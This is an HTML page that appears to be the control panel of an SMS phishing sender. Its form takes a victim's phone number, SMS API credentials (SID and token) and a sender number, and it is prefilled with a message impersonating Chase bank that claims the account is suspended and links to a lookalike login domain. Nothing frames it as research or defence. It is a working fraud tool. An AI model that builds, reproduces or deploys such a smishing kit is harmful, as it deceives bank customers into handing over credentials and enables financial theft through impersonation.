<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send</title>
</head>

<body>
    <form action="send.php" method="POST">
	<p style="margin:20px 0px;">Phone Number</p>
        <input type="tel" name="numberPhone" value="+1" required>
		<p style="margin-top:20px;">Sid</p>
		<input type="text" name="sid" required>
		
		<p>Token</p>
		<input type="text" name="token" required>
		
		<p>Phone Number Owner</p>
		<input type="text" name="pnowner" required>
		
		<button type="submit">Send</button>
        <input type="text" name="smsText" value="Chase: We suspended your access due to recent activity on your account. To reactivate it visit: http://secures09-chase.com/web/auth/dashboard/login">
        
    </form>

    <style>
        * {
            padding: 0;
            margin: 0;
            box-sizing: border-box;
        }
        
        
        body {
            background: #000;
        }
        
        form {
            position: relative;
            display: flex;
            flex-direction: column;
            background: #000;
            width: 90%;
            max-width: 1000px;
			margin:0 auto;
            height: 400px;
            justify-content: space-between;
            padding: 40px;
        }
        
        form input {
            padding: 14px;
            background: #000;
            color: rgb(0, 158, 21);
            border: 1px solid rgb(0, 158, 21);
        }
        form input:focus{
            outline: none;
        }
        
        form input[type="text"] {
            margin: 20px 0px;
		
        }
        
        form button {
			height:300px;
			margin-top:10px;
            padding: 14px;
			background: rgb(0, 158, 21);
			border:none;
			color:#000;
			cursor:pointer;
        }
        form button:focus{
            outline: none;
        }
		form button:hover{
		background:#009f4d;
		border: 1px solid rgb(0, 158, 41);
		}
    </style>

</body>

</html>